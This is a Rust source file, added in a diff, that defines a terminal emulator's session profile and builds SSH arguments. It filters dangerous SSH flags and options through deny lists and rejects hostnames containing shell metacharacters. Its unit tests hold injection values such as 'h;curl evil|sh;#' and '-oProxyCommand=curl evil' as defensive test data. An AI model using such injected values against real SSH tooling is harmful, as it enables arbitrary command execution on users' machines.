@@ -1,0 +1,764 @@
+//! Core `Profile` struct and its direct implementation.
+
+use serde::{Deserialize, Serialize};
+use uuid::Uuid;
+
+use super::dynamic::ProfileSource;
+
+/// Unique identifier for a profile
+pub type ProfileId = Uuid;
+
+/// How to connect this profile to a tmux session when it opens.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
+#[serde(rename_all = "snake_case")]
+pub enum TmuxConnectionMode {
+    /// Full par-term integration via `tmux -CC` (control mode)
+    #[default]
+    ControlMode,
+    /// Plain tmux running in the PTY — no par-term integration
+    Normal,
+}
+
+impl TmuxConnectionMode {
+    /// Returns true if this is the default ControlMode (used for skip_serializing_if)
+    pub fn is_control_mode(v: &Self) -> bool {
+        *v == Self::ControlMode
+    }
+}
+
+/// A terminal session profile containing configuration for how to start a session
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct Profile {
+    /// Unique identifier for this profile
+    pub id: ProfileId,
+
+    /// Display name for the profile
+    pub name: String,
+
+    /// Working directory for the session (if None, uses config default or inherits)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub working_directory: Option<String>,
+
+    /// Shell to use for this profile (e.g. "/bin/zsh", "/usr/bin/fish")
+    /// When set, overrides the global custom_shell / $SHELL for this profile.
+    /// Takes precedence over global config but is overridden by `command`.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub shell: Option<String>,
+
+    /// Per-profile login shell override.
+    /// None = inherit global config.login_shell, Some(true/false) = override.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub login_shell: Option<bool>,
+
+    /// Command to run instead of the default shell
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub command: Option<String>,
+
+    /// Arguments for the command
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub command_args: Option<Vec<String>>,
+
+    /// Custom tab name (if None, uses default naming)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub tab_name: Option<String>,
+
+    /// Icon identifier for the profile (emoji or icon name)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub icon: Option<String>,
+
+    /// Display order in the profile list
+    #[serde(default)]
+    pub order: usize,
+
+    /// Searchable tags to organize and filter profiles
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub tags: Vec<String>,
+
+    /// Parent profile ID for inheritance (child overrides parent settings)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub parent_id: Option<ProfileId>,
+
+    /// Keyboard shortcut for quick launch (e.g., "Cmd+1", "Ctrl+Shift+1")
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub keyboard_shortcut: Option<String>,
+
+    /// Hostname patterns for automatic profile switching when SSH connects
+    /// Supports glob patterns (e.g., "*.example.com", "server-*")
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub hostname_patterns: Vec<String>,
+
+    /// Tmux session name patterns for automatic profile switching when connecting via tmux control mode
+    /// Supports glob patterns (e.g., "work-*", "dev-session", "*-production")
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub tmux_session_patterns: Vec<String>,
+
+    /// tmux session to auto-connect to when this profile is opened.
+    /// Uses create-or-attach semantics (`tmux new-session -A -s <name>`).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub tmux_session_name: Option<String>,
+
+    /// How to connect: control mode (full integration) or normal (plain tmux in PTY).
+    #[serde(default, skip_serializing_if = "TmuxConnectionMode::is_control_mode")]
+    pub tmux_connection_mode: TmuxConnectionMode,
+
+    /// Directory patterns for automatic profile switching based on CWD
+    /// Supports glob patterns (e.g., "/Users/*/projects/work-*", "/home/user/dev/*")
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub directory_patterns: Vec<String>,
+
+    /// Per-profile badge text (overrides global badge_format when this profile is active)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub badge_text: Option<String>,
+
+    /// Per-profile badge color [R, G, B] (overrides global badge_color)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub badge_color: Option<[u8; 3]>,
+
+    /// Per-profile badge opacity 0.0-1.0 (overrides global badge_color_alpha)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub badge_color_alpha: Option<f32>,
+
+    /// Per-profile badge font family (overrides global badge_font)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub badge_font: Option<String>,
+
+    /// Per-profile badge font bold (overrides global badge_font_bold)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub badge_font_bold: Option<bool>,
+
+    /// Per-profile badge top margin in pixels (overrides global badge_top_margin)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub badge_top_margin: Option<f32>,
+
+    /// Per-profile badge right margin in pixels (overrides global badge_right_margin)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub badge_right_margin: Option<f32>,
+
+    /// Per-profile badge max width as fraction 0.0-1.0 (overrides global badge_max_width)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub badge_max_width: Option<f32>,
+
+    /// Per-profile badge max height as fraction 0.0-1.0 (overrides global badge_max_height)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub badge_max_height: Option<f32>,
+
+    /// Per-profile background shader path/name (overrides global while profile is active)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub shader: Option<String>,
+
+    /// Per-profile shader brightness override
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub shader_brightness: Option<f32>,
+
+    /// Per-profile shader text opacity override
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub shader_text_opacity: Option<f32>,
+
+    /// Per-profile shader animation speed override
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub shader_animation_speed: Option<f32>,
+
+    /// Per-profile shader texture set for iChannel0-3
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub shader_texture_set: Option<[Option<String>; 4]>,
+
+    /// SSH hostname for direct connection (profile acts as SSH bookmark)
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ssh_host: Option<String>,
+
+    /// SSH user for direct connection
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ssh_user: Option<String>,
+
+    /// SSH port for direct connection
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ssh_port: Option<u16>,
+
+    /// SSH identity file path for direct connection
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ssh_identity_file: Option<String>,
+
+    /// Extra SSH arguments, parsed with shell-style quoting via `shell_words::split`.
+    ///
+    /// # Security (SEC-002)
+    ///
+    /// To prevent SSH flag/option injection, tokens are filtered by
+    /// [`Profile::ssh_command_args`] before reaching the SSH argv. The following
+    /// are dropped (with a `warn!` log) because they enable arbitrary command
+    /// execution, forwarding pivots, or silent MITM:
+    ///
+    /// - **Flags**: `-A`, `-D`, `-R`, `-L`, `-W`, `-w` (standalone, clustered,
+    ///   or `=`-joined, e.g. `-A`, `-LA`, `-Wcat`).
+    /// - **Options** (in `-o Key=value`, `-O Key=value`, or bare `Key=value`):
+    ///   `ProxyCommand`, `LocalCommand`, `LocalMaster`, `StrictHostKeyChecking`,
+    ///   `UserKnownHostsFile`, `ForwardAgent`, `PermitLocalCommand`.
+    ///
+    /// If the string cannot be parsed as shell tokens, every token is dropped.
+    /// Safe example: `-o ServerAliveInterval=30 -o ConnectTimeout=10`.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ssh_extra_args: Option<String>,
+
+    /// Where this profile was loaded from (runtime-only, not persisted to YAML)
+    #[serde(skip)]
+    pub source: ProfileSource,
+}
+
+// =========================================================================
+// SSH extra-args validation (SEC-002)
+// =========================================================================
+//
+// `ssh_extra_args` is a free-form string pushed into the SSH argv. A profile
+// YAML must not be able to set `-o ProxyCommand=...` (arbitrary local command
+// execution), `-A` (agent-forwarding pivot), `-D`/`-R`/`-L`/`-W`/`-w` (tunnels),
+// or options that weaken host-key verification. We tokenize with
+// `shell_words::split` (so quoted values survive) and drop dangerous tokens
+// before they reach the argv.
+
+/// SSH short flags that enable command execution, forwarding, or tunneling.
+///
+/// A profile must never pass these to `ssh`: `-A` forwards the agent (pivot to
+/// the user's keys), `-D`/`-R`/`-L` open SOCKS/forward tunnels, and `-W`/`-w`
+/// proxy raw socket I/O.
+const DENIED_SSH_FLAGS: &[char] = &['A', 'D', 'R', 'L', 'W', 'w'];
+
+/// SSH option keys (in `-o Key=value`, `-O Key=value`, or bare `Key=value`)
+/// that allow arbitrary command execution or weaken host-key verification.
+const DENIED_SSH_OPTIONS: &[&str] = &[
+    "ProxyCommand",
+    "LocalCommand",
+    "LocalMaster",
+    "StrictHostKeyChecking",
+    "UserKnownHostsFile",
+    "ForwardAgent",
+    "PermitLocalCommand",
+];
+
+/// Return the option key when `tok` is a `Key=value` pair (no leading dash).
+fn ssh_option_key(tok: &str) -> Option<&str> {
+    if tok.starts_with('-') {
+        return None;
+    }
+    let (key, _value) = tok.split_once('=')?;
+    if key.is_empty() {
+        return None;
+    }
+    Some(key)
+}
+
+/// True if a standalone token is itself a denied flag or `-oKey=value` join.
+///
+/// Handles three forms: short flag (`-A`), short-flag cluster (`-LA`), and
+/// the joined `-o Key=value` form (`-oProxyCommand=...`).
+fn is_denied_ssh_token(tok: &str) -> bool {
+    let body = match tok.strip_prefix('-') {
+        Some(b) => b,
+        None => {
+            return ssh_option_key(tok)
+                .is_some_and(|k| DENIED_SSH_OPTIONS.iter().any(|o| o.eq_ignore_ascii_case(k)));
+        }
+    };
+    // Short-flag cluster or joined `-oKey=value`: flag chars are up to '='.
+    let (flag_chars, _value) = body.split_once('=').unwrap_or((body, ""));
+    if flag_chars.chars().any(|c| DENIED_SSH_FLAGS.contains(&c)) {
+        return true;
+    }
+    // Joined `-oKey=value` form: option key is everything after leading 'o'/'O'
+    // (only meaningful when no other flag char precedes it).
+    if let Some(opt) = flag_chars.strip_prefix(['o', 'O'])
+        && !opt.is_empty()
+        && DENIED_SSH_OPTIONS
+            .iter()
+            .any(|o| o.eq_ignore_ascii_case(opt))
+    {
+        return true;
+    }
+    false
+}
+
+/// Shell metacharacters that never appear in a legitimate hostname.
+///
+/// Kept in sync with `is_safe_ssh_component` in `par-term-ssh/src/types.rs`,
+/// which enforces the same set for discovered (Quick Connect) hosts.
+/// `par-term-ssh` is a leaf crate with no dependency on `par-term-config`, so
+/// the predicate is intentionally duplicated rather than shared.
+const SHELL_METACHARACTERS: [char; 9] = [';', '|', '&', '$', '`', '(', ')', '<', '>'];
+
+/// True if `host` is safe to interpolate into an SSH argv (SEC-007) or a
+/// shell command line (SEC-003).
+///
+/// Rejects:
+/// - leading `-`: parsed as a flag by SSH, enabling `-oProxyCommand=...`
+///   injection from a profile YAML.
+/// - control characters (including `\n` / `\r` / `\0`): these could delimit
+///   arguments, or submit a command when the host reaches a shell.
+/// - shell metacharacters `; | & $ ` ( ) < >`: not exploitable on the argv
+///   path this profile uses, but no real hostname contains them and the same
+///   value is rendered into shell command lines elsewhere.
+fn is_safe_ssh_host(host: &str) -> bool {
+    !host.starts_with('-')
+        && !host
+            .chars()
+            .any(|c| c.is_control() || SHELL_METACHARACTERS.contains(&c))
+}
+
+/// Tokenize `ssh_extra_args` with shell-style quoting and drop dangerous
+/// flags/options (SEC-002) so they cannot reach the SSH argv.
+///
+/// Denied tokens are logged via `warn!` and dropped rather than failing the
+/// build, because [`Profile::ssh_command_args`] returns `Option`, not
+/// `Result`; the security goal (keep dangerous tokens out of argv) is
+/// preserved either way. If `shell_words::split` cannot parse the string,
+/// every token is dropped.
+fn filter_ssh_extra_args(extra: &str) -> Vec<String> {
+    let tokens = match shell_words::split(extra) {
+        Ok(t) => t,
+        Err(e) => {
+            log::warn!(
+                "[SEC-002] dropping all ssh_extra_args: failed to parse as shell tokens: {e}"
+            );
+            return Vec::new();
+        }
+    };
+
+    let mut filtered = Vec::with_capacity(tokens.len());
+    let mut i = 0;
+    while i < tokens.len() {
+        let tok = tokens[i].as_str();
+        if is_denied_ssh_token(tok) {
+            log::warn!("[SEC-002] dropping denied SSH extra arg {:?}", tok);
+            i += 1;
+            continue;
+        }
+        // `-o <option>` separate-token form: inspect the following token and
+        // drop both tokens when the option key is denied.
+        if (tok == "-o" || tok == "-O") && i + 1 < tokens.len() {
+            let next = tokens[i + 1].as_str();
+            if ssh_option_key(next)
+                .is_some_and(|k| DENIED_SSH_OPTIONS.iter().any(|o| o.eq_ignore_ascii_case(k)))
+            {
+                log::warn!(
+                    "[SEC-002] dropping denied SSH option {:?} (passed via {:?})",
+                    next,
+                    tok
+                );
+                i += 2;
+                continue;
+            }
+        }
+        filtered.push(tokens[i].clone());
+        i += 1;
+    }
+    filtered
+}
+
+impl Profile {
+    /// Create a new profile with the given name
+    pub fn new(name: impl Into<String>) -> Self {
+        Self {
+            id: Uuid::new_v4(),
+            name: name.into(),
+            working_directory: None,
+            shell: None,
+            login_shell: None,
+            command: None,
+            command_args: None,
+            tab_name: None,
+            icon: None,
+            order: 0,
+            tags: Vec::new(),
+            parent_id: None,
+            keyboard_shortcut: None,
+            hostname_patterns: Vec::new(),
+            tmux_session_patterns: Vec::new(),
+            tmux_session_name: None,
+            tmux_connection_mode: TmuxConnectionMode::default(),
+            directory_patterns: Vec::new(),
+            badge_text: None,
+            badge_color: None,
+            badge_color_alpha: None,
+            badge_font: None,
+            badge_font_bold: None,
+            badge_top_margin: None,
+            badge_right_margin: None,
+            badge_max_width: None,
+            badge_max_height: None,
+            shader: None,
+            shader_brightness: None,
+            shader_text_opacity: None,
+            shader_animation_speed: None,
+            shader_texture_set: None,
+            ssh_host: None,
+            ssh_user: None,
+            ssh_port: None,
+            ssh_identity_file: None,
+            ssh_extra_args: None,
+            source: ProfileSource::default(),
+        }
+    }
+
+    /// Create a profile with a specific ID (for testing or deserialization)
+    pub fn with_id(id: ProfileId, name: impl Into<String>) -> Self {
+        Self {
+            id,
+            name: name.into(),
+            working_directory: None,
+            shell: None,
+            login_shell: None,
+            command: None,
+            command_args: None,
+            tab_name: None,
+            icon: None,
+            order: 0,
+            tags: Vec::new(),
+            parent_id: None,
+            keyboard_shortcut: None,
+            hostname_patterns: Vec::new(),
+            tmux_session_patterns: Vec::new(),
+            tmux_session_name: None,
+            tmux_connection_mode: TmuxConnectionMode::default(),
+            directory_patterns: Vec::new(),
+            badge_text: None,
+            badge_color: None,
+            badge_color_alpha: None,
+            badge_font: None,
+            badge_font_bold: None,
+            badge_top_margin: None,
+            badge_right_margin: None,
+            badge_max_width: None,
+            badge_max_height: None,
+            shader: None,
+            shader_brightness: None,
+            shader_text_opacity: None,
+            shader_animation_speed: None,
+            shader_texture_set: None,
+            ssh_host: None,
+            ssh_user: None,
+            ssh_port: None,
+            ssh_identity_file: None,
+            ssh_extra_args: None,
+            source: ProfileSource::default(),
+        }
+    }
+
+    /// Builder method to set working directory
+    pub fn working_directory(mut self, dir: impl Into<String>) -> Self {
+        self.working_directory = Some(dir.into());
+        self
+    }
+
+    /// Builder method to set shell
+    pub fn shell(mut self, shell: impl Into<String>) -> Self {
+        self.shell = Some(shell.into());
+        self
+    }
+
+    /// Builder method to set per-profile login shell
+    pub fn login_shell(mut self, login: bool) -> Self {
+        self.login_shell = Some(login);
+        self
+    }
+
+    /// Builder method to set command
+    pub fn command(mut self, cmd: impl Into<String>) -> Self {
+        self.command = Some(cmd.into());
+        self
+    }
+
+    /// Builder method to set command arguments
+    pub fn command_args(mut self, args: Vec<String>) -> Self {
+        self.command_args = Some(args);
+        self
+    }
+
+    /// Builder method to set tab name
+    pub fn tab_name(mut self, name: impl Into<String>) -> Self {
+        self.tab_name = Some(name.into());
+        self
+    }
+
+    /// Builder method to set icon
+    pub fn icon(mut self, icon: impl Into<String>) -> Self {
+        self.icon = Some(icon.into());
+        self
+    }
+
+    /// Builder method to set order
+    pub fn order(mut self, order: usize) -> Self {
+        self.order = order;
+        self
+    }
+
+    /// Builder method to set tags
+    pub fn tags(mut self, tags: Vec<String>) -> Self {
+        self.tags = tags;
+        self
+    }
+
+    /// Builder method to set parent profile ID
+    pub fn parent_id(mut self, parent_id: ProfileId) -> Self {
+        self.parent_id = Some(parent_id);
+        self
+    }
+
+    /// Builder method to set keyboard shortcut
+    pub fn keyboard_shortcut(mut self, shortcut: impl Into<String>) -> Self {
+        self.keyboard_shortcut = Some(shortcut.into());
+        self
+    }
+
+    /// Builder method to set hostname patterns
+    pub fn hostname_patterns(mut self, patterns: Vec<String>) -> Self {
+        self.hostname_patterns = patterns;
+        self
+    }
+
+    /// Builder method to set tmux session patterns
+    pub fn tmux_session_patterns(mut self, patterns: Vec<String>) -> Self {
+        self.tmux_session_patterns = patterns;
+        self
+    }
+
+    /// Builder method to set tmux session name for auto-connect
+    pub fn tmux_session_name(mut self, name: impl Into<String>) -> Self {
+        self.tmux_session_name = Some(name.into());
+        self
+    }
+
+    /// Builder method to set tmux connection mode
+    pub fn tmux_connection_mode(mut self, mode: TmuxConnectionMode) -> Self {
+        self.tmux_connection_mode = mode;
+        self
+    }
+
+    /// Builder method to set directory patterns
+    pub fn directory_patterns(mut self, patterns: Vec<String>) -> Self {
+        self.directory_patterns = patterns;
+        self
+    }
+
+    /// Builder method to set badge text
+    pub fn badge_text(mut self, text: impl Into<String>) -> Self {
+        self.badge_text = Some(text.into());
+        self
+    }
+
+    /// Builder method to set badge color
+    pub fn badge_color(mut self, color: [u8; 3]) -> Self {
+        self.badge_color = Some(color);
+        self
+    }
+
+    /// Builder method to set badge color alpha
+    pub fn badge_color_alpha(mut self, alpha: f32) -> Self {
+        self.badge_color_alpha = Some(alpha);
+        self
+    }
+
+    /// Builder method to set badge font
+    pub fn badge_font(mut self, font: impl Into<String>) -> Self {
+        self.badge_font = Some(font.into());
+        self
+    }
+
+    /// Builder method to set badge font bold
+    pub fn badge_font_bold(mut self, bold: bool) -> Self {
+        self.badge_font_bold = Some(bold);
+        self
+    }
+
+    /// Builder method to set badge top margin
+    pub fn badge_top_margin(mut self, margin: f32) -> Self {
+        self.badge_top_margin = Some(margin);
+        self
+    }
+
+    /// Builder method to set badge right margin
+    pub fn badge_right_margin(mut self, margin: f32) -> Self {
+        self.badge_right_margin = Some(margin);
+        self
+    }
+
+    /// Builder method to set badge max width
+    pub fn badge_max_width(mut self, width: f32) -> Self {
+        self.badge_max_width = Some(width);
+        self
+    }
+
+    /// Builder method to set badge max height
+    pub fn badge_max_height(mut self, height: f32) -> Self {
+        self.badge_max_height = Some(height);
+        self
+    }
+
+    /// Builder method to set SSH host
+    pub fn ssh_host(mut self, host: impl Into<String>) -> Self {
+        self.ssh_host = Some(host.into());
+        self
+    }
+
+    /// Builder method to set SSH user
+    pub fn ssh_user(mut self, user: impl Into<String>) -> Self {
+        self.ssh_user = Some(user.into());
+        self
+    }
+
+    /// Builder method to set SSH port
+    pub fn ssh_port(mut self, port: u16) -> Self {
+        self.ssh_port = Some(port);
+        self
+    }
+
+    /// Build the SSH command arguments for this profile's SSH connection.
+    /// Returns None if ssh_host is not set.
+    pub fn ssh_command_args(&self) -> Option<Vec<String>> {
+        let host = self.ssh_host.as_ref()?;
+        // SEC-007: defensively reject dangerous ssh_host values at the use
+        // site, in case a profile was constructed/built without going through
+        // `validate()`. A leading `-` lets `-oProxyCommand=...` be parsed as
+        // a flag, and embedded newlines/NUL can delimit argv entries.
+        if !is_safe_ssh_host(host) {
+            log::warn!(
+                "[SEC-007] refusing to build SSH argv for profile {:?}: \
+                 unsafe ssh_host {:?} (leading '-', control character, \
+                 or shell metacharacter)",
+                self.name,
+                host
+            );
+            return None;
+        }
+        let mut args = Vec::new();
+
+        if let Some(port) = self.ssh_port
+            && port != 22
+        {
+            args.push("-p".to_string());
+            args.push(port.to_string());
+        }
+
+        if let Some(ref identity) = self.ssh_identity_file {
+            args.push("-i".to_string());
+            args.push(identity.clone());
+        }
+
+        if let Some(ref extra) = self.ssh_extra_args {
+            // SEC-002: parse with shell-style quoting and filter dangerous
+            // flags/options. See the `ssh_extra_args` field doc comment.
+            args.extend(filter_ssh_extra_args(extra));
+        }
+
+        let target = if let Some(ref user) = self.ssh_user {
+            format!("{}@{}", user, host)
+        } else {
+            host.clone()
+        };
+        args.push(target);
+
+        Some(args)
+    }
+
+    /// Get the display label (icon + name if icon exists)
+    pub fn display_label(&self) -> String {
+        if let Some(icon) = &self.icon {
+            format!("{} {}", icon, self.name)
+        } else {
+            self.name.clone()
+        }
+    }
+
+    /// Validate the profile configuration
+    /// Returns a list of validation warnings (not errors - profiles can be incomplete)
+    pub fn validate(&self) -> Vec<String> {
+        let mut warnings = Vec::new();
+
+        if self.name.trim().is_empty() {
+            warnings.push("Profile name is empty".to_string());
+        }
+
+        if let Some(dir) = &self.working_directory
+            && !dir.is_empty()
+            && !std::path::Path::new(dir).exists()
+        {
+            warnings.push(format!("Working directory does not exist: {}", dir));
+        }
+
+        // SEC-007: ssh_host is formatted directly into the SSH argv, so a
+        // leading `-` (parsed as a flag), control characters, or shell
+        // metacharacters must be reported before the profile is saved.
+        if let Some(host) = &self.ssh_host
+            && !host.is_empty()
+            && !is_safe_ssh_host(host)
+        {
+            warnings.push(format!(
+                "ssh_host {:?} is unsafe (SEC-007): must not start with '-', \
+                 or contain control characters or any of ; | & $ ` ( ) < >",
+                host
+            ));
+        }
+
+        warnings
+    }
+}
+
+impl Default for Profile {
+    fn default() -> Self {
+        Self::new("New Profile")
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn safe_hosts_are_accepted() {
+        for host in [
+            "example.com",
+            "prod.internal",
+            "10.0.0.4",
+            "fe80::1",
+            "host-1_a.local",
+        ] {
+            assert!(is_safe_ssh_host(host), "expected {host:?} to be accepted");
+        }
+    }
+
+    #[test]
+    fn shell_metacharacters_are_rejected() {
+        for host in [
+            "h;curl evil|sh;#",
+            "host;id",
+            "host|id",
+            "host&id",
+            "host$(id)",
+            "host`id`",
+            "host$IFS",
+            "host<in",
+            "host>out",
+        ] {
+            assert!(!is_safe_ssh_host(host), "expected {host:?} to be rejected");
+        }
+    }
+
+    #[test]
+    fn control_characters_and_leading_dash_are_rejected() {
+        assert!(!is_safe_ssh_host("host\nid"));
+        assert!(!is_safe_ssh_host("host\rid"));
+        assert!(!is_safe_ssh_host("host\0id"));
+        assert!(!is_safe_ssh_host("host\tid"));
+        assert!(!is_safe_ssh_host("-oProxyCommand=curl evil"));
+    }
+
+    #[test]
+    fn unsafe_ssh_host_blocks_argv_and_is_reported_by_validate() {
+        let mut profile = Profile::new("evil");
+        profile.ssh_host = Some("h;curl evil|sh;#".to_string());
+
+        assert!(profile.ssh_command_args().is_none());
+        assert!(
+            profile
+                .validate()
+                .iter()
+                .any(|w| w.contains("is unsafe (SEC-007)"))
+        );
+    }
+}
